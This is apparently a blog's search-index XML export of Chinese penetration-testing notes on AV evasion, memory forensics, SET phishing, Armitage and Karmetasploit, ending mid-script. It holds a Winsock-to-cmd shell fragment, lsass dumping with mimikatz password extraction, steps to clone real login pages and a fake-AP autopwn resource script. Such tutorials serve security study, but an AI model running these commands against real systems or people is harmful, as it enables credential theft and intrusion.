class="line">ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line">CreateProcess(<span class="literal">NULL</span>,<span class="string">"cmd exe"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,TRUE,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;ini_processo,&amp;process_info);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
            <tag> MSF </tag>
            
            <tag> msfvenom </tag>
            
            <tag> Hyperion </tag>
            
            <tag> strings </tag>
            
            <tag> C </tag>
            
            <tag> gcc </tag>
            
            <tag> wine </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意程序及免杀技术现状</title>
      <link href="/2016/08/03/Avoid_Killing/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%8F%8A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF%E7%8E%B0%E7%8A%B6/"/>
      <url>/2016/08/03/Avoid_Killing/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%8F%8A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF%E7%8E%B0%E7%8A%B6/</url>
      
        <content type="html"><![CDATA[<h4 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a><strong>恶意软件</strong></h4><ul><li>病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序</li><li>在用户非自愿的情况下执行安装</li><li>出于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击…</li></ul><h4 id="防病毒软件"><a href="#防病毒软件" class="headerlink" title="防病毒软件"></a><strong>防病毒软件</strong></h4><ul><li><p>恶意程序最主要的防护手段</p><p>  杀毒软件/防病毒软件<br>  客户端/服务器/邮件防病毒</p></li><li><p>检测原理</p><p>  基于二进制文件中特种签名的黑名单检测方法<br>  于行为的分析方法(启发式)</p></li><li><p>事后手段</p><p>  永远落后于病毒发展</p></li></ul><h4 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a><strong>免杀技术</strong></h4><ul><li><p>修改二进制文件中的特征字符</p><p>  替换、擦除、修改</p></li><li><p>加密技术(crypter)</p><p>  通过加密使得特征字符不可读,从而逃避AV检测<br>  运行时分片分段的解密执行,注入进程或AV不检查的无害文件中</p></li><li><p>防病毒软件的检测</p><p>  恶意程序本身的特征字符<br>  加密器crypter的特征字符</p></li></ul><blockquote><h3 id="当前现状"><a href="#当前现状" class="headerlink" title="当前现状"></a><strong>当前现状</strong></h3></blockquote><p><strong>恶意软件制造者</strong></p><ul><li>编写私有RAT软件,避免普遍被AV所知的特征字符</li><li>使用独有crypter软件加密恶意程序</li><li>处事低调，尽量避免被发现</li><li>没有能力自己编写而已代码的黑客,通过直接修改特征码的方式免杀</li><li>Fully UnDetectable是最高追求(FUD)</li></ul><p><strong>AV厂商</strong></p><ul><li>广泛采集样本,尽快发现新出现的而已程序,更新病毒库</li><li>一般新的恶意软件安全UD窗口期是一周左右</li><li>与恶意软件制造者永无休止的拉锯战</li><li>新的启发式检测技术尚有待完善(误杀漏杀)</li></ul><p><strong>单一AV广商的病毒库很难达到100%覆盖</strong></p><ul><li><p><code>https://www.virustotal.com/</code><br>  接口被某些国家的AV软件免费利用，没有自己的病毒库</p></li><li><p><code>http://www.virscan.org/</code></p></li><li><p>在线多引擎查杀网站与AV厂商共享信息</p></li><li><p>搞黑的在线多引擎查毒站</p></li><li><p><code>https://nodistribute.com/</code></p></li><li><p><code>http://viruscheckmate.com/check/</code></p></li></ul><p><strong>常用RAT软件</strong></p><ul><li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li></ul><h4 id="NanoCore-Bate-Release"><a href="#NanoCore-Bate-Release" class="headerlink" title="NanoCore - Bate Release"></a><strong>NanoCore</strong> - Bate Release</h4>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
            <tag> RAT </tag>
            
            <tag> NanoCore </tag>
            
            <tag> crypter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>活取证和死取证</title>
      <link href="/2016/05/12/Forensics/%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/"/>
      <url>/2016/05/12/Forensics/%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h4 id="活取证"><a href="#活取证" class="headerlink" title="活取证"></a><strong>活取证</strong></h4><ul><li><p><strong>从内存还原文字</strong></p><ul><li><code>https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx</code>        #procdump</li><li><code>https://technet.microsoft.com/en-us/sysinternals/bb897439.aspx</code>        #Windows下的strings工具  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">procdump -ma notepad.exe notepad.dmp</span><br><span class="line">strings notepad.dmp &gt; notepad.txt</span><br></pre></td></tr></table></figure></li><li>其它文字处理程序也适用</li></ul></li><li><p><strong>从内存还原图片</strong></p><ul><li>远程桌面,画图工具,Virtualbox虚拟机<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 7.raw --profile&#x3D;Win7SP1x64 memdump -p 1456 -D test</span><br><span class="line">apt-get install gimp#kali安装gimp图片处理工具,媲美windows的PS</span><br><span class="line">mv mstsc.dmp mstsc.data#更改dmp文件格式</span><br><span class="line">gimp -&gt; open -&gt; Raw Image Data -&gt; 调整参数</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>从内存中提取明文密码</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">procdump -ma lsass.exe lsass.dmp#dump lsass.exe在内存文件,任何windows版本登录后都会启动lsass.exe进程,用于保存密码</span><br><span class="line"></span><br><span class="line">cd &#x2F;usr&#x2F;share&#x2F;windows-resources&#x2F;mimikatz&#x2F;x64#mimikatz win64版kali所在路径</span><br><span class="line"></span><br><span class="line">Mimikatz#使用mimikatz </span><br><span class="line"></span><br><span class="line">sekurlsa::minidump lsass.dmp#load 内存文件</span><br><span class="line"></span><br><span class="line">sekurlsa::logonPasswords#提取 dump文件的身份认证信息</span><br></pre></td></tr></table></figure><ul><li><p>Volatility 的 mimikatz 插件</p><ul><li><code>https://github.com/sans-dfir/sift-files/blob/master/volatility/mimikatz.py</code></li><li><code>volatility -f 7.raw imageinfo</code></li><li><code>volatility -f 7.raw --profile=Win7SP1x64 mimikatz</code></li></ul></li><li><p>Firefox 浏览器审计工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install dumpzilla</span><br><span class="line">dumpzilla &#x2F;root&#x2F;.mozilla&#x2F;firefox&#x2F;ugyw3gav.default&#x2F; --All</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="死取证"><a href="#死取证" class="headerlink" title="死取证"></a><strong>死取证</strong></h4><ul><li><p><strong>硬盘镜像</strong></p><ul><li>使用kali光盘启动计算机创建硬盘镜像文件</li><li>留足存储镜像文件的存储空间</li><li>dc3dd 传说来自美国空军计算机犯罪中心开发</li><li>dcfldd</li><li>guymager        #图形化dd工具</li><li>计算机取证技术参考数据集<ul><li><code>http://www.cfreds.nist.gov/Controlv1_0/control.dd</code></li></ul></li></ul></li><li><p><strong>DFF</strong> (Digital Forensics Framework)</p><ul><li>数字取证框架</li><li>kali2.0版本后被移出</li><li>支持命令行和友好图形化界面</li><li>Open Evidence        #红色表示已经删除的文件</li><li>发现恢复已经删除和隐藏的文件</li></ul></li><li><p><strong>Autopsy</strong></p><ul><li>非常流行的硬盘镜像分析工具</li><li>WebServer + 客户端架构</li></ul></li><li><p><strong>Extundelete</strong></p><ul><li>适用于ext3,ext4文件系统的反删除工具</li><li><code>Extundelete [device-file] --restore-file [restore location]</code></li></ul></li><li><p><strong>iPhone Backup Analyzer</strong></p><ul><li>分析iTunes 生成的iPhone 手机备份文件,并非电话image</li></ul></li><li><p><strong>Foremost</strong> (美国政府开发)</p><ul><li>从内存dump中恢复文档图片,支持raw,dd,iso,vmem等格式</li><li><code>foremost -t jpeg,gif,png,doc -i 7.raw</code></li></ul></li></ul><h4 id="网络取证"><a href="#网络取证" class="headerlink" title="网络取证"></a><strong>网络取证</strong></h4><ul><li>各种抓包dump分析</li><li>全流量镜像可还原历史</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 数字取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> strings </tag>
            
            <tag> mimikatz </tag>
            
            <tag> volatility </tag>
            
            <tag> 活取证 </tag>
            
            <tag> procdump </tag>
            
            <tag> gimp </tag>
            
            <tag> dc3dd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用取证工具Volatility进行内存文件分析及相关插件</title>
      <link href="/2016/05/11/Forensics/%E4%BD%BF%E7%94%A8%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7Volatility%E8%BF%9B%E8%A1%8C%E5%86%85%E5%AD%98%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%8F%92%E4%BB%B6/"/>
      <url>/2016/05/11/Forensics/%E4%BD%BF%E7%94%A8%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7Volatility%E8%BF%9B%E8%A1%8C%E5%86%85%E5%AD%98%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%8F%92%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h4 id="取证工具"><a href="#取证工具" class="headerlink" title="取证工具"></a><strong>取证工具</strong></h4><ul><li>不考虑法律因素,法庭证据,监管链,文档纪录等取证环节</li><li>只介绍Kali当中部分取证工具的使用方法</li><li>内存dump工具<ul><li><strong>Dumpit</strong> (windows)<ul><li>下载: <code>http://www.secist.com/wp-content/uploads/2016/11/DumpIt.zip</code></li></ul></li><li>内存文件与内存大小接近或者稍微大一点,raw格式</li></ul></li></ul><h4 id="分析内存文件-Volatility及相关插件"><a href="#分析内存文件-Volatility及相关插件" class="headerlink" title="分析内存文件    #Volatility及相关插件"></a><strong>分析内存文件</strong>    #Volatility及相关插件</h4><pre><code>volatility imageinfo -f xp.raw            #文件信息,关注profilevolatility hivelist -f XP.raw --profile=WinXPSP3x86        #数据库文件volatility -f XP.raw --profile=WinXPSP3x86 hivedump        #列出蜂巢volatility -f XP.raw --profile=WinXPSP3x86 hivedump -o 0xe124f8a8    #按虚拟内存地址查看注册表内容volatility -f XP.raw --profile=WinXPSP3x86 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;     #用户账号volatility -f xp.raw --profile=WinXPSP3x86 printkey -K &quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;        #最后登录的用户volatility -f XP.raw --profile=WinXPSP3x86 userassist    #正在运行的程序,运行过多少次,最后一次运行时间等volatility -f XP.raw --profile=WinXPSP3x86 pslist        #进程列表及物理内存位置volatility -f 7.raw --profile=Win7SP1x64 memdump -p 1456 -D test/    #dump进程内存    hexeditor 1456.dmp        #16进制查看内存文件    strings 1456.dmp &gt; 1111.txt        #提取字符串查看 grep password / @volatility cmdscan -f 7.raw --profile=Win7SP1x64    #命令行历史volatility netscan -f 7.raw --profile=Win7SP1x64    #网络连接volatility iehistory -f 7.raw --profile=Win7SP1x64        #ie历史volatility -f 7.raw --profile=Win7SP1x64 hivelist        #列出蜂巢    volatility -f 7.raw --profile=Win7SP1x64 hashdump -y system内存虚地址 -s SAM内存虚地址        #提取hash</code></pre><p><strong>Volatility三方Firefoxhistory插件</strong></p><pre><code>http://downloads.volatilityfoundation.org/contest/2014/DaveLasalle_ForensicSuite.zip/usr/lib/python2.7/dist-packages/volatility/plugins/    #放到此路径volatility -f 7.raw --profile=Win7SP1x64 firefoxhistory        #查看firefox历史</code></pre><p><strong>USN日志记录插件</strong></p><ul><li>NTFS特性,用于跟踪硬盘内容变化(不记录具体变更内容)<ul><li><code>https://raw.githubusercontent.com/tomspencer/volatility/master/usnparser/usnparser.py</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 7.raw --profile&#x3D;Win7SP1x64 usnparser --output&#x3D;csv --outputfile&#x3D;usn.csv</span><br><span class="line">#查看USN日志并导出到csv文件</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><strong>Timeline插件</strong></p><pre><code>volatility -f 7.raw --profile=Win7SP1x64 timeliner    #从多个位置收集大量系统活动信息</code></pre><p><strong>内存取证发现恶意程序</strong></p><ul><li><p>恶意程序库</p><ul><li><code>https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples</code></li><li><code>https://code.google.com/archive/p/volatility/wikis/SampleMemoryImages.wiki</code></li></ul></li><li><p>XP: 建立meterpreter session 后 dump 内存分析</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">volatility -f xp.raw --profile&#x3D;WinXPSP3x86 pstree</span><br><span class="line">volatility connscan#网络连接</span><br><span class="line">volatility getsids -p 111,222#SID,查看进程权限</span><br><span class="line">volatility dlllist -p 111,222#数量</span><br><span class="line">volatility malfind -p 111,222 -D test#输出结果查毒</span><br><span class="line">file *.dmp#查看文件类型</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 数字取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数字取证 </tag>
            
            <tag> Volatility </tag>
            
            <tag> Dumpit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字取证科学简介及取证方法</title>
      <link href="/2016/05/01/Forensics/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81%E7%A7%91%E5%AD%A6%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%8F%96%E8%AF%81%E6%96%B9%E6%B3%95/"/>
      <url>/2016/05/01/Forensics/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81%E7%A7%91%E5%AD%A6%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%8F%96%E8%AF%81%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h4 id="取证科学简介"><a href="#取证科学简介" class="headerlink" title="取证科学简介"></a><strong>取证科学简介</strong></h4><ul><li>Forensic investigations</li><li>法庭取证调查</li><li>事件相应调查<ul><li>黑客攻击,渗透测试留痕</li></ul></li></ul><p><strong>什么是Forensic科学</strong></p><ul><li>法医的,用于法庭的,辩论学,法医学</li><li>为了侦破案件还原事实真相,收集法庭证据的一系列科学方法<ul><li>参考本地区法律要求</li><li>实践操作通用原则</li></ul></li></ul><p><strong>CSI:物理取证</strong></p><ul><li>指纹,DNA,弹道,血迹</li><li>物理取证的理论基础是物质交换原则</li></ul><p><strong>数字取证/计算机取证/电子取证</strong></p><ul><li>智能设备,计算机,手机平板,IoT,有线及无线通信,数据存储</li></ul><h4 id="计算机取证通用原则"><a href="#计算机取证通用原则" class="headerlink" title="计算机取证通用原则"></a><strong>计算机取证通用原则</strong></h4><ul><li><p><strong>维护证据完整性</strong></p><ul><li>数字取证比物理取证幸运得多,可以有无限数量的拷贝进行分析</li><li>数字HASH值验证数据完整性</li></ul></li><li><p><strong>维护监管链</strong></p><ul><li>物理证物保存在证物袋中,每次取出使用严格纪录,避免破坏污染</li><li>数字证物原始版本写保护,使用拷贝进行分析</li></ul></li><li><p><strong>标准的操作步骤</strong></p><ul><li>证物使用严格按照规范流程,即使事后证明流程有误(免责)</li></ul></li><li><p>取证分析全部过程纪录文档</p></li><li><p><strong>数字取证者的座右铭</strong></p><ul><li>不要破坏数据现场(看似简单,实际几乎无法实现)</li><li>寄存器,CPU缓存,I/O设备缓存等易失性数据几乎无法获取</li><li>系统内存是主要的易失性存储介质取证对象,不修改无法获取其中数据</li><li>非易失性存储介质通常使用完整镜像拷贝保存</li><li>正常关机还是直接拔掉电源(数据丢失破坏)</li></ul></li><li><p><strong>证据搜索</strong></p><ul><li>数据</li><li>信息</li><li>证据</li></ul></li><li><p>作为安全从业者</p><ul><li>通过取证还原黑客入侵的轨迹</li><li>作为渗透测试和黑客攻击区分标准<ul><li>世纪佳缘事件</li><li>印象笔记渗透测试事件</li></ul></li></ul></li></ul><h4 id="取证方法"><a href="#取证方法" class="headerlink" title="取证方法"></a><strong>取证方法</strong></h4><ul><li><p><strong>活取证</strong></p><ul><li>抓取文件metadata,创建时间线,命令历史,分析日志文件,哈希摘要,转存内存信息</li><li>使用未受感染的干净程序执行取证</li><li>U盘 / 网络 存储收集到的数据</li></ul></li><li><p><strong>死取证</strong></p><ul><li>关机后制作硬盘镜像,分析镜像(MBR,GPT,LVM)</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 数字取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数字取证 </tag>
            
            <tag> 计算机取证 </tag>
            
            <tag> 电子取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>社会工程学工具包Setoolkit</title>
      <link href="/2016/03/20/Exploits/MsF/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E5%B7%A5%E5%85%B7%E5%8C%85Setoolkit/"/>
      <url>/2016/03/20/Exploits/MsF/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E5%B7%A5%E5%85%B7%E5%8C%85Setoolkit/</url>
      
        <content type="html"><![CDATA[<h4 id="为什么在这说社会工程学-Social-Engineering"><a href="#为什么在这说社会工程学-Social-Engineering" class="headerlink" title="为什么在这说社会工程学 (Social Engineering)"></a><strong>为什么在这说社会工程学</strong> (Social Engineering)</h4><ul><li>Metasploit 可以很好的配合到社会工程学攻击的各个阶段</li><li>Setoolkit 工具包大量依赖 Metasploit</li><li>基于浏览器等客户端软件漏洞实现对客户端计算机的攻击</li></ul><h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a><strong>社会工程学</strong></h4><ul><li><p><strong>社会</strong></p><ul><li>人是社会化的动物(人与人之间的关系,群体利益决定结构架构)</li></ul></li><li><p><strong>工程</strong></p><ul><li>依据标准的步骤完成任务达成目标的一套方法</li><li>通过与人的交流,使用欺骗伪装等手段绕过安全机制实现入侵的非技术手段</li></ul></li></ul><p><strong>社会工程学攻击的四个阶段</strong></p><ol><li><strong>研究</strong>:<ul><li>信息收集(Web,媒体,垃圾桶,物理接触),确定并研究目标人</li></ul></li><li><strong>钩子</strong>:<ul><li>与目标建立第一次交谈(Hook,下套)</li></ul></li><li><strong>下手</strong>:<ul><li>与目标建立信任并获取信息</li></ul></li><li><strong>退场</strong>:<ul><li>不引起目标怀疑的离开攻击现场</li></ul></li></ol><ul><li><p><strong>类型</strong></p><ul><li><p>基于人的社工</p><ul><li>搭载</li><li>伪造身份</li><li>偷听/窃肩</li><li>反社工</li><li>垃圾桶工程</li></ul></li><li><p>基于计算机的社工</p><ul><li>弹出窗口</li><li>内部网络攻击</li><li>钓鱼邮件</li><li>419尼日利亚骗局</li><li>短信诈骗</li></ul></li></ul></li></ul><h4 id="Social-Engineering-Toolkit-SET"><a href="#Social-Engineering-Toolkit-SET" class="headerlink" title="Social-Engineering Toolkit (SET)"></a><strong>Social-Engineering Toolkit</strong> (SET)</h4><ul><li><p>SET工具菜单</p><ol><li>鱼叉式网络钓鱼攻击向量</li><li>网站攻击向量</li><li>传染性媒体生成器    </li><li>创建有效载荷和侦听器</li><li>群发邮件攻击</li><li>基于Arduino的攻击向量</li><li>无线接入点攻击向量</li><li>QRCode生成器攻击向量</li><li>Powershell攻击向量<ol start="10"><li>第三方模块</li></ol></li></ol></li><li><p>站点克隆: 1 2 3 2</p><ul><li><code>https://login.taobao.com/member/login.jhtml</code></li><li><code>http://admin.smeshx.gov.cn/login.php</code></li></ul></li><li><p>制作BadUSB: 1 3 1 2</p></li><li><p>发送钓鱼邮件: 1 1 2</p></li><li><p>WEB站站攻击向量: 1 2 1 2</p></li><li><p>中间文件全部存在 ~/.set目录中</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> 社会工程学 </tag>
            
            <tag> Setoolkit </tag>
            
            <tag> BadUSB </tag>
            
            <tag> 钓鱼邮件 </tag>
            
            <tag> Arduino </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MsF图形化端Armitage简介及使用方法</title>
      <link href="/2016/03/19/Exploits/MsF/MsF%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%AB%AFArmitage%E7%AE%80%E4%BB%8B%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2016/03/19/Exploits/MsF/MsF%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%AB%AFArmitage%E7%AE%80%E4%BB%8B%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h4 id="Armitage图形化前端"><a href="#Armitage图形化前端" class="headerlink" title="Armitage图形化前端"></a><strong>Armitage图形化前端</strong></h4><ul><li><p>开源免费图形前端</p><ul><li>作者自称是众多不会使用matasploit的安全专家之一(命令行)</li><li>MSF基于命令行,缺少直观的GUI图形用户接口</li></ul></li><li><p>Armitage只是调用MSF的漏洞利用能力</p><ul><li>Armitage的每一个GUI操作都可以对应MSF中的一条命令</li></ul></li><li><p>红队团队合作模拟对抗</p><ul><li>分为客户端(armitage)和服务器(msfrpcd)两部分</li><li><code>/usr/share/armitage/teamserver ip password</code></li></ul></li><li><p>可脚本化</p></li></ul><p><strong>启动方式</strong></p><pre><code>service postgresql startTeamserver    服务器: teamserver 服务器IP 连接密码    客户端: armitage</code></pre><ul><li>单机启动<ul><li>Armitage</li><li>GUI 启动</li><li><code>127.0.0.1:55553</code></li></ul></li></ul><h4 id="Armitage发现主机"><a href="#Armitage发现主机" class="headerlink" title="Armitage发现主机"></a><strong>Armitage发现主机</strong></h4><ul><li><p>手动添加IP地址</p></li><li><p>扫描结果导入(nmap,nessus,openvas,appscan,nexpose,awvs)</p><ul><li>使用nmap扫描网段所有主机导出到host.xml文件<ul><li><code>nmap 192.168.190.0/24 --open -oX host.xml</code></li></ul></li></ul></li><li><p>直接扫描发现(nmap,msf扫描模块)</p></li><li><p>DNS枚举发现</p></li><li><p>扫描端口及服务</p></li></ul><p><strong>工作区 workspace</strong></p><ul><li>个人视角的目标动态显示筛选,同一team的队员算定义工作区</li><li>基于IP地址的工作区划分</li><li>基于端口的工作区划分</li><li>基于操作系统的工作区划分</li><li>基于标签的工作区划分</li></ul><h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a><strong>生成payload</strong></h4><ul><li><p>主动获取目标</p><ul><li>Armitage<ul><li><code>bind_hidden_tcp</code></li><li><code>bind_tcp</code></li><li><code>reverse_tcp</code></li><li><code>Ms08_067</code></li></ul></li></ul></li><li><p>被动获取目标</p><ul><li>Browser_autopwn2</li></ul></li></ul><p><strong>Meterpreter shell 能力展示</strong></p><ul><li>菜单功能</li><li>Cortana 脚本  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Veil-Evasion: </span><br><span class="line">locate veil-evasion#查找脚本所在路径位置</span><br><span class="line">&#x2F;use&#x2F;share&#x2F;veil-evasion&#x2F;tools&#x2F;cortana&#x2F;veil_evasion.cna</span><br><span class="line"></span><br><span class="line">#更多脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rsmudge&#x2F;cortana-scripts</span><br></pre></td></tr></table></figure></li><li>别无他法的最后选择<ul><li>Attacks<ul><li>Find Attacks        #自动分析匹配漏洞利用模块</li><li>Hail Mary            #上帝啊!赐予我力量吧!</li><li>洪水式漏洞利用代码执行,流量及特征明显,容易被发现</li></ul></li></ul></li></ul><h4 id="Armitage-现状"><a href="#Armitage-现状" class="headerlink" title="Armitage 现状"></a><strong>Armitage 现状</strong></h4><ul><li>维护不及时,传言此项目已荒废</li><li>仍然是目前唯一开源免费的metasploit图形前端</li><li>Metasploit 曾被发现两个远程代码执行漏洞<ul><li>问题都出在WEB组件方面</li><li>MSF不受影响</li></ul></li><li>安全面前软软平等<ul><li>没有无漏洞的软件</li></ul></li></ul><p><strong>Cobalt Strike</strong></p><ul><li>Cobalt Strike 也是一款以Metasploit为基础的GUI框架式渗透测试工具,集成了端口转发,服务扫描,自动化溢出,多模式端口监听,exe,powershell木马生成等.</li><li>商业红队模拟实战工具</li><li>有破解版</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> nmap </tag>
            
            <tag> armitage </tag>
            
            <tag> teamserver </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MsF无线攻击资源组件之Karmetasploit</title>
      <link href="/2016/03/18/Exploits/MsF/MsF%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB%E8%B5%84%E6%BA%90%E7%BB%84%E4%BB%B6%E4%B9%8BKarmetasploit/"/>
      <url>/2016/03/18/Exploits/MsF/MsF%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB%E8%B5%84%E6%BA%90%E7%BB%84%E4%BB%B6%E4%B9%8BKarmetasploit/</url>
      
        <content type="html"><![CDATA[<h4 id="Karmetasploit-无线攻击资源组件"><a href="#Karmetasploit-无线攻击资源组件" class="headerlink" title="Karmetasploit     无线攻击资源组件"></a><strong>Karmetasploit</strong>     无线攻击资源组件</h4><ul><li>伪造AP,嗅探密码,截获数据,浏览器攻击</li><li>官方下载的只适用于演示或概念验证,实际攻击场景无效</li><li>下载资源文件<ul><li><code>wget https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt</code></li><li>资源文件可根据自己的需求自定义  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">db_connect postgres:toor@127.0.0.1&#x2F;msfbook</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;browser_autopwn</span><br><span class="line"></span><br><span class="line">setg AUTOPWN_HOST 10.0.0.1</span><br><span class="line">setg AUTOPWN_PORT 55550</span><br><span class="line">setg AUTOPWN_URI &#x2F;ads</span><br><span class="line"></span><br><span class="line">set LHOST 10.0.0.1</span><br><span class="line">set LPORT 45000</span><br><span class="line">set SRVPORT 55550</span><br><span class="line">set URIPATH &#x2F;ads</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;pop3</span><br><span class="line">set SRVPORT 110</span><br><span class="line">set SSL false</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use 